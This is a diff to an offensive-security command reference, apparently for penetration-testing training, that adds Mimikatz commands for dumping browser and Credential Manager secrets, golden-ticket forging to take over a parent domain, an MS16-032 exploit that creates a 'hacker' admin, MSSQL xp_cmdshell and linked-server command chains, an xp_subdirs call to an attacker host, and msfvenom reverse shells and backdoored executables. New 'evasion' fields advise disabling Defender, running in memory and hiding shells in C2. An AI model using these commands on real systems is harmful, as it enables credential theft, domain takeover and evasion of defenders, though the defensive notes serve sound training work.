-          "label": "Forward",
-          "command": "portfwd add -l <local_port> -p <remote_port> -r <target>"
-        },
-        {
           "label": "Reverse",
           "command": "portfwd add -R -l <local_port> -p <remote_port> -L <attacker_ip>"
         }
@@ -40155,11 +42092,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "Steal",
-          "command": "steal_token <pid>",
-          "description": "Steal access token from process (impersonate user)"
-        },
         {
           "label": "Revert",
           "command": "rev2self",
@@ -40359,7 +42291,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Mimikatz uses DPAPI master keys to decrypt Chrome/Edge saved passwords and cookies from the user's profile.",
+        "why_it_works": "Chrome encrypts saved logins with a DPAPI-protected key tied to the user; with the user's context (or masterkey) that key is recoverable, so the passwords decrypt.",
         "prerequisites": "Code execution as the target user (DPAPI keys are per-user) or SYSTEM/domain backup key.",
         "impact": "Plaintext browser-saved passwords and session cookies for account takeover.",
         "detection": "[MITRE T1555.003] Access to browser Login Data / DPAPI master keys; mimikatz dpapi module; reads of the user's Chrome profile.",
@@ -40374,7 +42306,27 @@ const COMMAND_DATA = {
         "vulnerable_config": "# WDigest enabled (stores cleartext in LSASS on Windows 7/2008 and older, or if re-enabled):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\n#   UseLogonCredential = 1   <-- BAD: cleartext in LSASS\n\n# No Credential Guard:\n# msinfo32 -> Virtualization-based security Services Running: (none listed)\n\n# No LSA Protection:\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n#   RunAsPPL = 0  (default on most systems) <-- LSASS not protected process",
         "secure_config": "# 1. Disable WDigest (prevent cleartext in LSASS):\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' \\\n    -Name UseLogonCredential -Value 0\n\n# 2. Enable LSA Protection (PPL — Protected Process Light):\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RunAsPPL -Value 1\n# Requires reboot; blocks non-signed tools from reading LSASS memory\n\n# 3. Enable Credential Guard (strongest protection):\n# GPO: Computer Config > Admin Templates > System > Device Guard\n#   'Turn On Virtualization Based Security' = Enabled\n#   'Credential Guard Configuration' = Enabled with UEFI lock\n\n# 4. Add privileged accounts to Protected Users group:\n# Members use Kerberos-only auth — no NTLM, no WDigest, no CredSSP\nAdd-ADGroupMember 'Protected Users' -Members 'Domain Admins','Administrator'"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "SharpChrome (offline-friendly)",
+          "command": ".\\SharpChrome.exe logins /unprotect"
+        },
+        {
+          "label": "Also grab cookies",
+          "command": ".\\SharpChrome.exe cookies /unprotect"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Get the DPAPI masterkey",
+          "command": "dpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\<SID>\\<guid>\" /sid:<SID> /password:<password>"
+        },
+        {
+          "label": "Decrypt Chrome logins",
+          "command": "dpapi::chrome /in:\"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect"
+        }
+      ]
     },
     {
       "id": "ad-mimikatz-sekurlsa",
@@ -40582,7 +42534,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Mimikatz reads the Windows Credential Manager / vault to recover stored credentials for the current user.",
+        "why_it_works": "The Windows Credential Manager / DPAPI vault stores saved credentials that the OS can transparently decrypt for the logged-on user, so Mimikatz recovers them in plaintext.",
         "prerequisites": "Code execution as the target user (or SYSTEM) on Windows.",
         "impact": "Plaintext/stored credentials from the user's vault for reuse.",
         "detection": "[MITRE T1555.004] Access to the Credential Manager vault; mimikatz signatures; vaultcmd/cred APIs.",
@@ -40597,7 +42549,27 @@ const COMMAND_DATA = {
         "vulnerable_config": "# WDigest enabled (stores cleartext in LSASS on Windows 7/2008 and older, or if re-enabled):\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\n#   UseLogonCredential = 1   <-- BAD: cleartext in LSASS\n\n# No Credential Guard:\n# msinfo32 -> Virtualization-based security Services Running: (none listed)\n\n# No LSA Protection:\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n#   RunAsPPL = 0  (default on most systems) <-- LSASS not protected process",
         "secure_config": "# 1. Disable WDigest (prevent cleartext in LSASS):\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' \\\n    -Name UseLogonCredential -Value 0\n\n# 2. Enable LSA Protection (PPL — Protected Process Light):\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RunAsPPL -Value 1\n# Requires reboot; blocks non-signed tools from reading LSASS memory\n\n# 3. Enable Credential Guard (strongest protection):\n# GPO: Computer Config > Admin Templates > System > Device Guard\n#   'Turn On Virtualization Based Security' = Enabled\n#   'Credential Guard Configuration' = Enabled with UEFI lock\n\n# 4. Add privileged accounts to Protected Users group:\n# Members use Kerberos-only auth — no NTLM, no WDigest, no CredSSP\nAdd-ADGroupMember 'Protected Users' -Members 'Domain Admins','Administrator'"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "DPAPI vault creds",
+          "command": "vault::cred /patch"
+        },
+        {
+          "label": "Enumerate DPAPI master keys",
+          "command": "sekurlsa::dpapi"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Enable debug",
+          "command": "privilege::debug"
+        },
+        {
+          "label": "Dump Credential Manager secrets",
+          "command": "sekurlsa::credman"
+        }
+      ]
     },
     {
       "id": "ad-golden-ticket-mimikatz",
@@ -40698,6 +42670,34 @@ const COMMAND_DATA = {
       },
       "tools": [
         "mimikatz"
+      ],
+      "variations": [
+        {
+          "label": "Inject directly (ptt)",
+          "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ptt"
+        },
+        {
+          "label": "Save to file instead",
+          "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ticket:golden.kirbi"
+        }
+      ],
+      "steps": [
+        {
+          "label": "DCSync the child krbtgt hash",
+          "command": "lsadump::dcsync /user:<child_domain>\\krbtgt"
+        },
+        {
+          "label": "Get child domain SID + parent Enterprise Admins SID",
+          "command": "Get-DomainSID ; Get-DomainGroup -Domain <parent> -Identity 'Enterprise Admins' | select distinguishedname,objectsid"
+        },
+        {
+          "label": "Forge golden ticket with /sids = EA (SID history)",
+          "command": "kerberos::golden /user:Administrator /domain:<child_domain> /sid:<child_sid> /krbtgt:<hash> /sids:<parent_ea_sid> /ptt"
+        },
+        {
+          "label": "Access the parent DC",
+          "command": "dir \\\\<parent_dc>\\C$"
+        }
       ]
     },
     {
@@ -40769,12 +42769,12 @@ const COMMAND_DATA = {
         {
           "command": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt_hash> /run:powershell",
           "caption": "PTH: spawn PowerShell instead of cmd.exe",
-          "label": "sekurlsa::pth /user:<user> /domain…"
+          "label": "PtH -> PowerShell"
         },
         {
           "command": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt_hash> /run:\"mmc.exe -s\"",
           "caption": "PTH: spawn MMC for GUI lateral movement",
-          "label": "sekurlsa::pth /user:<user> /domain…"
+          "label": "PtH -> MMC console"
         }
       ],
       "defense": {
@@ -40798,7 +42798,7 @@ const COMMAND_DATA = {
     {
       "id": "mimikatz-ptt",
       "name": "Mimikatz - Pass the Ticket / OverPass the Hash",
-      "command": "kerberos::ptt <ticket.kirbi>",
+      "command": "kerberos::ptt <ticket>",
       "description": "Injects Kerberos tickets into the current session on Windows. Export tickets with sekurlsa::tickets /export, or dump keys with sekurlsa::ekeys, then either import a .kirbi (ptt) or forge a TGT from a key/hash (OverPass the Hash via sekurlsa::pth).",
       "platform": "windows",
       "requires": [
@@ -40881,10 +42881,6 @@ const COMMAND_DATA = {
         {
           "label": "Extract Keys",
           "command": "privilege::debug\nsekurlsa::ekeys"
-        },
-        {
-          "label": "Inject Ticket",
-          "command": "kerberos::ptt <ticket.kirbi>"
         },
         {
           "label": "OverPass the Hash",
@@ -40971,12 +42967,12 @@ const COMMAND_DATA = {
         {
           "command": "lsadump::dcsync /user:Administrator",
           "caption": "DCSync — dump specific user hash from DC replication (requires domain admin or replication rights)",
-          "label": "lsadump::dcsync"
+          "label": "DCSync - one user"
         },
         {
           "command": "lsadump::dcsync /domain:<domain> /all /csv",
           "caption": "DCSync — dump all domain hashes as CSV",
-          "label": "lsadump::dcsync"
+          "label": "DCSync - whole domain (CSV)"
         },
         {
           "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"lsadump::lsa /patch\" \"exit\"",
@@ -41136,7 +43132,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1105",
           "MITRE T1140"
-        ]
+        ],
+        "evasion": "Touch only what you need; remove any scheduled task/mounted disk/dropped file you create."
       }
     },
     {
@@ -41317,7 +43314,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1003.002",
           "MITRE T1552.001"
-        ]
+        ],
+        "evasion": "Touch only what you need; remove any scheduled task/mounted disk/dropped file you create."
       }
     },
     {
@@ -41618,7 +43616,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1053.005"
-        ]
+        ],
+        "evasion": "Touch only what you need; remove any scheduled task/mounted disk/dropped file you create."
       }
     },
     {
@@ -41718,7 +43717,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1053.005",
           "MITRE T1068"
-        ]
+        ],
+        "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable — test against a snapshot to avoid crashing the target."
       }
     },
     {
@@ -41807,8 +43807,29 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M26",
           "MITRE T1068"
-        ]
-      }
+        ],
+        "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable — test against a snapshot to avoid crashing the target."
+      },
+      "variations": [
+        {
+          "label": "Compiled C# / EXE build",
+          "command": "MS16-032.exe"
+        },
+        {
+          "label": "Meterpreter local exploit",
+          "command": "use exploit/windows/local/ms16_032_secondary_logon_handle_privesc"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm 2+ CPU cores (needed by the race)",
+          "command": "echo %NUMBER_OF_PROCESSORS%"
+        },
+        {
+          "label": "Run to add a local admin",
+          "command": "Invoke-MS16-032 -Command \"net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add\""
+        }
+      ]
     },
     {
       "id": "msfvenom-aspx",
@@ -41900,19 +43921,14 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "description": "Generate ASPX Meterpreter reverse HTTPS shell (IIS target)",
-          "command": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=443 -f aspx > shell.aspx",
-          "label": "reverse_https · aspx"
-        },
-        {
           "description": "Generate ASPX reverse TCP shell (plaintext)",
           "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=4444 -f aspx > shell.aspx",
-          "label": "reverse_tcp · aspx"
+          "label": "reverse_tcp aspx (x64)"
         },
         {
           "description": "Generate 32-bit ASPX shell (older IIS/IIS6)",
           "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=4444 -f aspx > shell32.aspx",
-          "label": "reverse_tcp · aspx"
+          "label": "reverse_tcp aspx (x86)"
         },
         {
           "description": "Set up MSF multi/handler to catch ASPX shell callback",
@@ -41924,7 +43940,7 @@ const COMMAND_DATA = {
     {
       "id": "msfvenom-backdoor-template",
       "name": "MSFVenom - Backdoored Executable",
-      "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -x <template.exe> -k -e x86/shikata_ga_nai -a x86 --platform windows -i 5 -o backdoored.exe",
+      "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -x <template_exe> -k -e x86/shikata_ga_nai -a x86 --platform windows -i 5 -o backdoored.exe",
       "description": "Embeds a payload into a legitimate template executable with -x, keeping the original program working via -k so the backdoor is less obvious. Layering encoding and archiving can further reduce detection.",
       "platform": "linux",
       "requires": [
@@ -42229,11 +44245,6 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "description": "Encode EXE payload with shikata_ga_nai (3 iterations)",
-          "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=443 -e x86/shikata_ga_nai -i 3 -f exe > encoded.exe",
-          "label": "shell_reverse_tcp · exe · enc shik…"
-        },
-        {
           "description": "Inject encoded payload into legitimate binary (template)",
           "command": "msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=443 -e x86/shikata_ga_nai -i 3 -x /usr/share/windows-binaries/plink.exe -f exe > plink_backdoor.exe",
           "label": "shell_reverse_tcp · exe · enc shik…"
@@ -42333,9 +44344,20 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application constructs SQL queries using string concatenation with unsanitized user input — either in the query body or stored procedure arguments. No prepared statements or parameterized queries are used. Additionally, the database user account used by the application has excessive privileges (SELECT/INSERT/UPDATE/DELETE on all tables, or even xp_cmdshell access on MSSQL).",
         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
-        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
+        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
+        "evasion": "Re-disable xp_cmdshell immediately after use; run OS commands sparingly (each spawns sqlservr->cmd, which EDR flags); prefer native SQL for data exfil over shelling out; impersonate rather than adding logins."
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Enumerate links",
+          "command": "SELECT * FROM master..sysservers"
+        },
+        {
+          "label": "Chain execution",
+          "command": "EXECUTE('EXECUTE(''xp_cmdshell ''''whoami'''''') AT [<link2>]') AT [<link1>]"
+        }
+      ]
     },
     {
       "id": "mssql-capture-hash",
@@ -42443,7 +44465,13 @@ const COMMAND_DATA = {
         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
         "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "xp_subdirs variant",
+          "command": "EXEC master..xp_subdirs '\\\\<attacker_ip>\\share\\'"
+        }
+      ]
     },
     {
       "id": "mssql-xp-cmdshell",
@@ -42539,7 +44567,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
         "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Enable it first if disabled",
+          "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
+        },
+        {
+          "label": "Via linked server",
+          "command": "EXECUTE('xp_cmdshell ''whoami''') AT [<linked_server>]"
+        }
+      ]
     },
     {
       "type": "command",
@@ -42639,8 +44677,37 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1505.001",
           "MITRE T1078"
-        ]
-      }
+        ],
+        "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+      },
+      "variations": [
+        {
+          "label": "Enable + run in one query",
+          "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
+        },
+        {
+          "label": "Run an OS command",
+          "command": "EXEC xp_cmdshell 'whoami'"
+        },
+        {
+          "label": "PowerUpSQL",
+          "command": "Invoke-SQLOSCmd -Instance <instance> -Command 'whoami' -RawResults"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Connect (Windows or SQL auth)",
+          "command": "mssqlclient.py <domain>/<user>:<password>@<ip> -windows-auth"
+        },
+        {
+          "label": "Enable xp_cmdshell",
+          "command": "enable_xp_cmdshell"
+        },
+        {
+          "label": "Execute OS commands",
+          "command": "xp_cmdshell whoami /priv"
+        }
+      ]
     },
     {
       "id": "mssql-connect",
@@ -42714,10 +44781,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "mssqlclient (Linux)",
-          "command": "mssqlclient.py -p 1433 <user>@<ip>"
-        },
-        {
           "label": "sqlcmd (Windows)",
           "command": "sqlcmd -S <server> -U <user> -P '<password>'"
         },
@@ -42732,7 +44795,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Connects to MSSQL with valid credentials or Windows auth (mssqlclient.py, sqsh, sqlcmd) to interact with the database.",
+        "why_it_works": "MSSQL accepts Windows or SQL authentication; a valid login (or the service running as a privileged account) grants query access that can be escalated to OS commands.",
         "prerequisites": "Valid SQL/Windows credentials and network access to MSSQL (1433).",
         "impact": "An authenticated SQL session - the base for enumeration and abuse.",
         "detection": "[MITRE T1078] SQL login audit (successful/failed logon events, 18453/18456); 4624 for Windows-auth; connection to 1433.",
@@ -42744,7 +44807,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application constructs SQL queries using string concatenation with unsanitized user input — either in the query body or stored procedure arguments. No prepared statements or parameterized queries are used. Additionally, the database user account used by the application has excessive privileges (SELECT/INSERT/UPDATE/DELETE on all tables, or even xp_cmdshell access on MSSQL).",
         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
-        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
+        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
+        "evasion": "Re-disable xp_cmdshell immediately after use; run OS commands sparingly (each spawns sqlservr->cmd, which EDR flags); prefer native SQL for data exfil over shelling out; impersonate rather than adding logins."
       },
       "type": "command"
     },
@@ -42829,8 +44893,33 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1046",
           "MITRE T1082"
-        ]
-      }
+        ],
+        "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+      },
+      "variations": [
+        {
+          "label": "PowerUpSQL domain discovery",
+          "command": "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose"
+        },
+        {
+          "label": "nmap MSSQL info",
+          "command": "nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info <target>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find SQL instances",
+          "command": "Get-SQLInstanceDomain"
+        },
+        {
+          "label": "Test which you can access",
+          "command": "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose"
+        },
+        {
+          "label": "Enumerate links + privileges",
+          "command": "Get-SQLServerLinkCrawl -Instance <instance> -Verbose"
+        }
+      ]
     },
     {
       "type": "command",
@@ -42925,10 +45014,6 @@ const COMMAND_DATA = {
         {
           "label": "Metasploit mssql_ping",
           "command": "use auxiliary/scanner/mssql/mssql_ping\nset rhosts <ip>\nrun"
-        },
-        {
-          "label": "mssqlclient.py (Windows auth)",
-          "command": "python3 mssqlclient.py Administrator@<ip> -windows-auth"
         }
       ],
       "opsec": "loud",
@@ -42948,7 +45033,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application constructs SQL queries using string concatenation with unsanitized user input — either in the query body or stored procedure arguments. No prepared statements or parameterized queries are used. Additionally, the database user account used by the application has excessive privileges (SELECT/INSERT/UPDATE/DELETE on all tables, or even xp_cmdshell access on MSSQL).",
         "vulnerable_config": "# PHP — classic string concatenation (vulnerable):\n$username = $_GET['user'];   // attacker input: ' OR '1'='1\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"'\";\n$result = $conn->query($query);\n// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n// Returns all rows regardless of input\n\n# MSSQL — app user with xp_cmdshell rights:\n# App uses: sa account or db_owner role  (executes OS commands via xp_cmdshell)\nEXEC xp_cmdshell 'whoami'  -- works if xp_cmdshell enabled and user is sysadmin",
-        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users"
+        "secure_config": "# PHP — parameterized queries (PDO prepared statements):\n$stmt = $conn->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$_GET['user']]);  // input is a parameter, never interpreted as SQL\n$result = $stmt->fetchAll();\n\n# Node.js — parameterized (pg module):\nconst result = await client.query(\n    'SELECT * FROM users WHERE username = $1',\n    [req.query.user]  // always a value, never SQL\n);\n\n# MSSQL hardening:\n-- Disable xp_cmdshell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n\n-- Use least-privilege application user:\nCREATE LOGIN appuser WITH PASSWORD = 'StrongPass!';\nCREATE USER appuser FOR LOGIN appuser;\nGRANT SELECT, INSERT ON dbo.orders TO appuser;  -- only what's needed\n-- Never grant db_owner or sysadmin to application users",
+        "evasion": "Re-disable xp_cmdshell after use; keep OS command execution minimal; use built-in SQL to read data instead of shelling out."
       }
     },
     {
@@ -43026,7 +45112,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "EXECUTE AS abuses IMPERSONATE permission to assume a higher-privileged SQL login (e.g. sa), escalating within the DB.",
+        "why_it_works": "If a login is granted IMPERSONATE on a higher-privileged login (a common misconfig), EXECUTE AS lets you assume that login's rights — often reaching sysadmin.",
         "prerequisites": "A SQL login granted IMPERSONATE on a higher-privileged login.",
         "impact": "Elevated SQL privileges (up to sysadmin) - unlocking xp_cmdshell, linked servers, and data.",
         "detection": "[MITRE T1078] EXECUTE AS / impersonation events in SQL audit; a low-priv login performing sysadmin actions.",
@@ -43038,9 +45124,30 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application constructs SQL queries using string concatenation with unsanitized user input — either in the query body or stored procedure arguments. No prepared statements or parameterized queries are used. Additionally, the database user account used by the application has excessive privileges (SELECT/INSERT/UPDATE/DELETE on all tables, or even xp_cmdshell access on MSSQL).",
